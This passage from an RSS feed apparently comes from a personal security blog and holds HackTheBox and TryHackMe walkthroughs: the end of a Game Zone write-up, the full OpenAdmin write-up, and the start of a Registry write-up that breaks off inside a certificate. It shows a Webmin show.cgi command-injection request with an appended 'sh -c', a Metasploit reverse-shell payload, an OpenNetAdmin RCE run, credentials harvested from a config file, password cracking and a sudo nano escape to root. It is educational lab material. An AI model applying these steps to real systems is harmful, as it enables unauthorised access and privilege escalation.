&lt;p&gt;Initially, to confirm what the port is for, I ran nmap against it:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; # nmap -sC -sV -p 10000 -Pn 127.0.0.1
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-26 06:33 BST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00012s latency).

PORT      STATE SERVICE VERSION
10000/tcp open  http    MiniServ 1.580 (Webmin httpd)
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: MiniServ/1.580
|_http-title: Login to Webmin

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.86 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And visiting it in a browser confirms that its a web accessible console named &lt;code&gt;webmin&lt;/code&gt; - taking a wild guess via our SSH access to the box (since &lt;code&gt;locate&lt;/code&gt; didn&amp;rsquo;t find anything) I tried &lt;code&gt;/etc/webmin&lt;/code&gt; and found most of the files for that service. The majority were unreadable and owned by root but one of them, a file named &lt;code&gt;version&lt;/code&gt; was not:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;agent47@gamezone:/etc/webmin$ cat version
1.580
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If we run this through exploit DB, we will see that there&amp;rsquo;s a metasploit module available to exploit this specific version of webmin:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Webmin 1.580 - &amp;lsquo;/file/show.cgi&amp;rsquo; Remote Command Execution (Metasploit)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;If we load that up we can see that it&amp;rsquo;s sending encoded payloads via an authenticated session. This leverages a vulnerability in the services show.cgi component allowing an attacker to run commands with root privilages. We first need credentials though - I initialy tried hydra against the form but got myself banned rather quickly, then I stopped being stupid and tried our existing creds for Agent47 and they do work.&lt;/p&gt;
&lt;p&gt;The correct metasploit module is &lt;code&gt;exploit/unix/webapp/webmin_show_cgi_exec&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;If we send the module through our burp proxy by running:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;set PROXIES http:127.0.0.1:8080&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We can follow the chain of events for the most part - its a little more complicated as the payload, in this case, is another metasploit module thats encoded and uploaded via the FileManager functionality in Webmin. Effectively it uploads a file and then executes that via &lt;code&gt;sh&lt;/code&gt; - the default payload is &lt;code&gt;cmd/unix/reverse_perl&lt;/code&gt; and this basically consists of a Perl command that will intiiate a reverse shell. This gets dumped into a file thats named using a random set of characters/numbers and then called in the following manner:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;GET /file/show.cgi/bin/UP8Qmwh|sh -c
Host: 127.0.0.1:10000
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Cookie: sid=e6b8f4f5ff9b17ac77529c6e91c88667
Content-Type: application/x-www-form-urlencoded
Connection: close
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Assuming the file exists and the payload is correct, it&amp;rsquo;ll get executed. I may see if I can supply a manual payload at a later date, for now though Metasploit is the easiest way to handle this.&lt;/p&gt;
&lt;p&gt;This gets you a shell, though, and as the root user non-the-less. From there you can proceed to get the flag.&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;final-thoughts&#34;&gt;Final Thoughts&lt;/h1&gt;
&lt;p&gt;All in all, this is a guided room so the difficulty curve will only go so far. In this case, we tried to take it a step further by manual exlpoitation of SQL. Wherever possible, and in line with expectations for the OSCP, I try and refrain from using SQLMap and Metasploit as much as possible. They are one-time/limited use tools in the OSCP exam so becoming reliant on them instead of your own knowledge isn&amp;rsquo;t going to be favorable in the long term. Hopefully this better explains exactly how this is done, as well as detailing how SQLMap itself handle this. In the last stage, manual exploitation wasn&amp;rsquo;t something I dug into due to time but &lt;a href=&#34;http://www.americaninfosec.com/research/dossiers/AISG-12-001.pdf&#34; target=&#34;_blank&#34;&gt;this&lt;/a&gt;
 URL is referenced within the Metasploit module and outlines, in more detail, how that works.&lt;/p&gt;
&lt;p&gt;None-the-less, this is a great learning experience for anyone that hasn&amp;rsquo;t manually exploited SQLi to this degree before. I hope you enjoyed the read.&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>OpenAdmin [Easy] - Linux</title>
      <link>https://5ysk3y.github.io/htb/guides/openadmin/</link>
      <pubDate>Sat, 02 May 2020 00:00:00 +0000</pubDate>
      
      <guid>https://5ysk3y.github.io/htb/guides/openadmin/</guid>
      <description>Overview OpenAdmin was a quick and easy Linux box that uses a common CVE for an application called ONA to get us intial access to the box. From there, we hop between 2 user through some enumeration before exploiting a sudo command to get root.
 NMAP Scan Let&amp;rsquo;s begin by seeing what ports are currently open:</description>
      <content>
  &lt;figure class=&#34;left&#34; &gt;
    &lt;img src=&#34;https://5ysk3y.github.io/images/guides/htb/openadmin.png&#34;   /&gt;
    
  &lt;/figure&gt;


&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
&lt;p&gt;OpenAdmin was a quick and easy Linux box that uses a common CVE for an application called ONA to get us intial access to the box. From there, we hop between 2 user through some enumeration before exploiting a sudo command to get root.&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;nmap-scan&#34;&gt;NMAP Scan&lt;/h1&gt;
&lt;p&gt;Let&amp;rsquo;s begin by seeing what ports are currently open:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# Nmap 7.80 scan initiated Sat Jan  4 19:56:44 2020 as: nmap -v -A -oA nmap/openadmin_initial 10.10.10.171
Nmap scan report for 10.10.10.171
Host is up (0.026s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=1/4%OT=22%CT=1%CU=38593%PV=Y%DS=2%DC=T%G=Y%TM=5E10EE11
OS:%P=x86_64-unknown-linux-gnu)SEQ(SP=107%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A
OS:)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54
OS:DST11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120
OS:)ECN(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+
OS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
OS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A
OS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D
OS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4
OS:0%CD=S)

Uptime guess: 34.527 days (since Sun Dec  1 07:18:22 2019)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT      ADDRESS
1   42.44 ms 10.10.14.
2   42.49 ms 10.10.10.171

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan  4 19:57:05 2020 -- 1 IP address (1 host up) scanned in 21.38 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;user-pwn&#34;&gt;User Pwn&lt;/h1&gt;
&lt;p&gt;In a nutshell, we can see two open ports. Since SSH is up to date and we can&amp;rsquo;t directly compromise it, let&amp;rsquo;s move our attention to the web port. I did an initial Gobuster scan on the IP that also targeted HTML/PHP files  - this found 2 more sub-dir websites:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/index.html (Status: 200)
/music (Status: 301)
/artwork (Status: 301)
/sierra (Status: 301)
/server-status (Status: 403)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;/music&lt;/code&gt; and &lt;code&gt;/sierra&lt;/code&gt; seem to be independant sites, neither with anything too interesting present. That said, one of them (/music) had a link to login that points here:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://10.10.10.171/ona/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;And this is vulnerable to a certain exploit:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;OpenNetAdmin 18.1.1 - Remote Code Execution&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This script requires dos2unix running on it prior to use because of weird character breaks etc but it works as intended out the box. I hijacked an existing reverse-shell script on the server, replacing the port and my IP with sed. Also opened up 9001 on the firewall as its locked down by default. Running the script via the browser got me a rev shell:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/bin/bash ./47691.sh 10.10.10.171/ona/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Once on the box I had a look at the &lt;code&gt;/etc/passwd&lt;/code&gt; file and found the following 2 users with shell access, aside from root:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Jimmy&lt;/li&gt;
&lt;li&gt;Joanna&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I then ran linpeas as the www-data user. Most of the interesting stuff appears to to be in the ONA (OpenNetAdmin) dir, i.e. /opt/ona. In here we got some DB creds:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;database_settings.inc.php&lt;/code&gt; :&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
$ona_contexts=array (
  &#39;DEFAULT&#39; =&amp;gt;
  array (
    &#39;databases&#39; =&amp;gt;
    array (
      0 =&amp;gt;
      array (
        &#39;db_type&#39; =&amp;gt; &#39;mysqli&#39;,
        &#39;db_host&#39; =&amp;gt; &#39;localhost&#39;,
        &#39;db_login&#39; =&amp;gt; &#39;ona_sys&#39;,
        &#39;db_passwd&#39; =&amp;gt; &#39;n1nj4W4rri0R!&#39;,
        &#39;db_database&#39; =&amp;gt; &#39;ona_default&#39;,
        &#39;db_debug&#39; =&amp;gt; false,
      ),
    ),
    &#39;description&#39; =&amp;gt; &#39;Default data context&#39;,
    &#39;context_color&#39; =&amp;gt; &#39;#D3DBFF&#39;,
  ),
);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Testing this pass with one of the 2 available users; we get access as &lt;em&gt;Jimmy&lt;/em&gt;. I also tried as the Joanna user but that failed. So we have one login:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;jimmy:n1nj4W4rri0R&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Theres a folder named &lt;code&gt;internal&lt;/code&gt; within &lt;code&gt;/var/www&lt;/code&gt; and its owned by Jimmy - only he and the &lt;code&gt;internal&lt;/code&gt; group can access it so www-data cannot. Theres also a few PHP pages in here - they can be viewed directly by running a PHP server:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;php -S [ip:port]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Viewing this you can see that it&amp;rsquo;s a login page that takes you to a page containing a &lt;code&gt;shell_exec&lt;/code&gt; statement. The code itself thankfully contians the password to get past the login form: &lt;code&gt;Revealed&lt;/code&gt; - this was a SHA-512 hash that I cracked via hashes.org.  For testing I also did this via JTR on the my new, totally original, not-ippsec-inspired-what-so-ever, kracken rig:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@kracken:~/hashes/htb/openadmin# john --show --format=Raw-SHA512 hash
jimmy:Revealed
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The problem with the exec statement is that it runs as as the user thats running the file, i.e. Jimmy, so I couldn&amp;rsquo;t initially see how I&amp;rsquo;d be able to leverage it. Even more annoyingly the default exec command is a cat request to Joanna&amp;rsquo;s id_rsa file, so it&amp;rsquo;s like a double taunt.&lt;/p&gt;
&lt;p&gt;Digging further, I eventually noticed that the internal group shares both Jimmy and Joanna as common members:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;jimmy@openadmin:/home$ cat /etc/group | grep -i internal
internal:x:1002:jimmy,joanna
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Looking at listening ports on the machine we can also see something else interesting:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;jimmy@openadmin:~$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 ::1:52846               :::*                    LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;A unique local port (52846) is listening - curling it from the machine shows a page very similar to the one mentoned above in the internal folder. The problem is we cant access that port from our side to view the page via something like firefox. Except we can, using SSH port forwarding of course. I did this in the following manner:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Login to the box via the usual means.&lt;/li&gt;
&lt;li&gt;On a brand new line press: &lt;code&gt;Shift&lt;/code&gt; + &lt;code&gt;~&lt;/code&gt; + &lt;code&gt;C&lt;/code&gt; to drop into an interactive SSH prompt.&lt;/li&gt;
&lt;li&gt;Forward in the following manner:&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;-L 9001:127.0.0.1:52846&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Alternatively, if I&amp;rsquo;ve fluffed that up on the writeup, you can also do it in the following single line:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ssh -L 9001:127.0.0.1:52846 -f -N jimmy@10.10.10.171&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This basically says that the client (i.e ME) will listen (-L) on port 9001, and SSH will tunnel those connections from 127.0.0.1, port 52846 - which is what we want as per the netstat. The full SSH command includes 2 additional flags - &lt;code&gt;-f&lt;/code&gt; backgrounds the request so you don&amp;rsquo;t see any output and &lt;code&gt;-N&lt;/code&gt; tells SSH that no commands are to be run - both of these make it so you can seamlessly forward the port to your machine without any output or interaction besides the orignial command.&lt;/p&gt;
&lt;p&gt;Viewing the page on the forwarded port, we see something interesting. It runs the EXACT same exec code that we see in the &lt;code&gt;internal&lt;/code&gt; directory only this time it runs it as Joanna - meaning we can actually cat the contents of the id_rsa file in her home folder. Result.&lt;/p&gt;
&lt;p&gt;Once I had the RSA key we used SSH2John to convert it to a format john was happy with and then passed it to the kracken which got us the passphrase: &lt;code&gt;bloodninjas&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Got in as Joanna. Got the user flag. Boom.&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;root-pwn&#34;&gt;Root Pwn&lt;/h1&gt;
&lt;p&gt;Root was unbelievably easy compared to the user steps.&lt;/p&gt;
&lt;p&gt;I ran linPeas but it wasn&amp;rsquo;t really necessary; doing standard enum is enough. So I ran:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sudo -l&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;And found out Joanna had sudo access to the following command without a password:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sudo /bin/nano /opt/priv&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;It was purely a case of running that exact command along with &lt;a href=&#34;https://gtfobins.github.io/gtfobins/nano/#sudo&#34; target=&#34;_blank&#34;&gt;this&lt;/a&gt;
 from GTFOBins:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
2f907ed450b361b2c2bf4e8795d5b561
#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Done! :)&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Registry [Hard] - Linux</title>
      <link>https://5ysk3y.github.io/htb/guides/registry/</link>
      <pubDate>Wed, 01 Apr 2020 16:21:41 +0000</pubDate>
      
      <guid>https://5ysk3y.github.io/htb/guides/registry/</guid>
      <description>Overview Registry is an amazing Linux machine - it&amp;rsquo;s rated as hard but I didn&amp;rsquo;t find it all too difficult. That said it was very enjoyable and involves you, firstly, taking advantage of a Docker API to pull down an image from a Registry on the box. From there we get a shell and proceed to gain access to a hosted CMS called Bolt; this enables us to execute code as the www-data user which, conveniently, also has sudo access to a binary that can perform full system backups.</description>
      <content>
  &lt;figure class=&#34;left&#34; &gt;
    &lt;img src=&#34;https://5ysk3y.github.io/images/guides/htb/registry.png&#34;   /&gt;
    
  &lt;/figure&gt;


&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
&lt;p&gt;Registry is an amazing Linux machine - it&amp;rsquo;s rated as hard but I didn&amp;rsquo;t find it all too difficult. That said it was very enjoyable and involves you, firstly, taking advantage of a Docker API to pull down an image from a Registry on the box. From there we get a shell and proceed to gain access to a hosted CMS called Bolt; this enables us to execute code as the www-data user which, conveniently, also has sudo access to a binary that can perform full system backups. Leveraging that, we&amp;rsquo;re able to backup the root folder giving us access to the final flag and some SSH keys for good measure.&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;nmap-scan&#34;&gt;NMAP Scan&lt;/h1&gt;
&lt;p&gt;As standard we will begin with our nmap scan:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# Nmap 7.80 scan initiated Sun Oct 20 15:33:23 2019 as: nmap -A -oA nmap/registry_initial -vvv 10.10.10.159
Nmap scan report for 10.10.10.159
Host is up, received echo-reply ttl 63 (0.020s latency).
Scanned at 2019-10-20 15:33:23 BST for 27s
Not shown: 997 closed ports
Reason: 997 resets
PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDCZtxPox0F/6ZQbPbgwP9t13ZX+DegufV+sVoqTGWfuE2/jQwVLR+TCLJM4EDg4UJol4OHl0ATQBkPM7CSi1DS3oZgNlaASXQoZFzHUN4KF1/B6uShfMcszORHOBSRZAMe5nuesre2oJtrqhyO1VS2TMOitFLmKEaDImHy7EXe8qnaK8CrVFAxdUOG8iQFEiZUt8JZJ6CPgfIu00t4JpIl9l4aOFEZT6H7xf7K74ov2KNyP6WCoOtdDf7Rhfwcfo6dogHxssH6O/d+FgN6KJ8q2gJjUZVYYjZHTfGCPRukmSDYQNglQkvzuOy3umUTwNt5NdjYBT+vemcOIaDPm0SX
|   256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDFZI3tSfqp1WJF1TjoPa3J6j94yzXZMtFj92P8HcBUXCosmhsTsRa5rBvt20Es/qTp2otqYz3R3jf9O0OGC/tc=
|   256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINNAMP4YFJGAx3ip1MPEsDuXUhgHXOIxrVTUCOxqJeRr
80/tcp  open  http     syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
443/tcp open  ssl/http syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=docker.registry.htb
| Issuer: commonName=Registry
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-05-06T21:14:35
| Not valid after:  2029-05-03T21:14:35
| MD5:   0d6f 504f 1cb5 de50 2f4e 5f67 9db6 a3a9
| SHA-1: 7da0 1245 1d62 d69b a87e 8667 083c 39a6 9eb2 b2b5
| -----BEGIN CERTIFICATE-----
| MIICrTCCAZUCCQDjC7Es6pyC3TANBgkqhkiG9w0BAQsFADATMREwDwYDVQQDDAhS
| ZWdpc3RyeTAeFw0xOTA1MDYyMTE0MzVaFw0yOTA1MDMyMTE0MzVaMB4xHDAaBgNV
| BAMME2RvY2tlci5yZWdpc3RyeS5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw
| ggEKAoIBAQDAQd6mLhCheVIu0IOf2QIXH4UZGnzIrcQgDfTelpc3E4QxH0nq+KPg
| 7gsPuMz/WMnmZUh3dLKLXb7hqJ2Wk8vQM6tt+PbKna/D6WKXqGM3JnSLKW1YOkIu
| AuQenMOxJxh41IA0+3FqdlEdtaOV8sP+bgFB/uG2NDfPOLciJMop+d5pwpcxro8l
| egZASYNM3AbZjWAotmMqHwjGwZwqqxXxn61DixNDN2GWLQHO7QPUVUjF+Npso3zN
| ZLUJ1vkAtl6kFlmLTJgjlTUuE78udKD5r/NLqHNxxxObaSFXrmm2maDDoAkhobOt
| ljpa/U/fCv8g03KToaXVZYb6BfFEP5FBAgMBAAEwDQYJKoZIhvcNAQELBQADggEB
| AF3zSdj6GB3UYb431GRyTe32Th3QgpbXsQXA2qaLjI0n3qOF5PYnADgKsDzTxtDU
| z4e5vLz0Y3NhMKobft+vzBt2GbJIzo8DbmDBD3z1WQU+GLTnXyUAPF9J6fhtUgKm
| hoq1S8YsKRt/NMJwZMk3GiIw1c7KEN3/9XqJ9lfIyeXqVc6XBvuiZ+ssjDId0RZO
| 7eWWELxItMHPVScwWpOA7B4INPM6USKGy7hUTFcPJZB7+ElTFO2h0c4MwFQcSqKW
| BUG+oUPpMOoO99ZRnX8D5/H3dvbuBsuqKgRrPmQnMehoWs7pNRUDudUnnLfGEJHh
| PEyspHOCbg1C6a0gI1xo0c0=
|_-----END CERTIFICATE-----
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/20%OT=22%CT=1%CU=40128%PV=Y%DS=2%DC=T%G=Y%TM=5DAC70
OS:4E%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=A)OP
OS:S(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST
OS:11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)EC
OS:N(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Uptime guess: 33.561 days (since Tue Sep 17 02:05:49 2019)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   27.26 ms 10.10.14.1
2   27.27 ms 10.10.10.159

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Oct 20 15:33:50 2019 -- 1 IP address (1 host up) scanned in 27.77 seconds
skynet Boxes/ForwardSlash » cd ../Registry
skynet Boxes/Registry » cat nmap/registry_initial.nmap
# Nmap 7.80 scan initiated Sun Oct 20 15:33:23 2019 as: nmap -A -oA nmap/registry_initial -vvv 10.10.10.159
Nmap scan report for 10.10.10.159
Host is up, received echo-reply ttl 63 (0.020s latency).
Scanned at 2019-10-20 15:33:23 BST for 27s
Not shown: 997 closed ports
Reason: 997 resets
PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDCZtxPox0F/6ZQbPbgwP9t13ZX+DegufV+sVoqTGWfuE2/jQwVLR+TCLJM4EDg4UJol4OHl0ATQBkPM7CSi1DS3oZgNlaASXQoZFzHUN4KF1/B6uShfMcszORHOBSRZAMe5nuesre2oJtrqhyO1VS2TMOitFLmKEaDImHy7EXe8qnaK8CrVFAxdUOG8iQFEiZUt8JZJ6CPgfIu00t4JpIl9l4aOFEZT6H7xf7K74ov2KNyP6WCoOtdDf7Rhfwcfo6dogHxssH6O/d+FgN6KJ8q2gJjUZVYYjZHTfGCPRukmSDYQNglQkvzuOy3umUTwNt5NdjYBT+vemcOIaDPm0SX
|   256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDFZI3tSfqp1WJF1TjoPa3J6j94yzXZMtFj92P8HcBUXCosmhsTsRa5rBvt20Es/qTp2otqYz3R3jf9O0OGC/tc=
|   256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINNAMP4YFJGAx3ip1MPEsDuXUhgHXOIxrVTUCOxqJeRr
80/tcp  open  http     syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
443/tcp open  ssl/http syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=docker.registry.htb
| Issuer: commonName=Registry
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-05-06T21:14:35
| Not valid after:  2029-05-03T21:14:35
| MD5:   0d6f 504f 1cb5 de50 2f4e 5f67 9db6 a3a9
| SHA-1: 7da0 1245 1d62 d69b a87e 8667 083c 39a6 9eb2 b2b5
| -----BEGIN CERTIFICATE-----
| MIICrTCCAZUCCQDjC7Es6pyC3TANBgkqhkiG9w0BAQsFADATMREwDwYDVQQDDAhS
| ZWdpc3RyeTAeFw0xOTA1MDYyMTE0MzVaFw0yOTA1MDMyMTE0MzVaMB4xHDAaBgNV
| BAMME2RvY2tlci5yZWdpc3RyeS5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw
| ggEKAoIBAQDAQd6mLhCheVIu0IOf2QIXH4UZGnzIrcQgDfTelpc3E4QxH0nq+KPg
| 7gsPuMz/WMnmZUh3dLKLXb7hqJ2Wk8vQM6tt+PbKna/D6WKXqGM3JnSLKW1YOkIu
| AuQenMOxJxh41IA0+3FqdlEdtaOV8sP+bgFB/uG2NDfPOLciJMop+d5pwpcxro8l
| egZASYNM3AbZjWAotmMqHwjGwZwqqxXxn61DixNDN2GWLQHO7QPUVUjF+Npso3zN
| ZLUJ1vkAtl6kFlmLTJgjlTUuE78udKD5r/NLqHNxxxObaSFXrmm2maDDoAkhobOt
| ljpa/U/fCv8g03KToaXVZYb6BfFEP5FBAgMBAAEwDQYJKoZIhvcNAQELBQADggEB
| AF3zSdj6GB3UYb431GRyTe32Th3QgpbXsQXA2qaLjI0n3qOF5PYnADgKsDzTxtDU
| z4e5vLz0Y3NhMKobft+vzBt2GbJIzo8DbmDBD3z1WQU+GLTnXyUAPF9J6fhtUgKm
| hoq1S8YsKRt/NMJwZMk3GiIw1c7KEN3/9XqJ9lfIyeXqVc6XBvuiZ+ssjDId0RZO
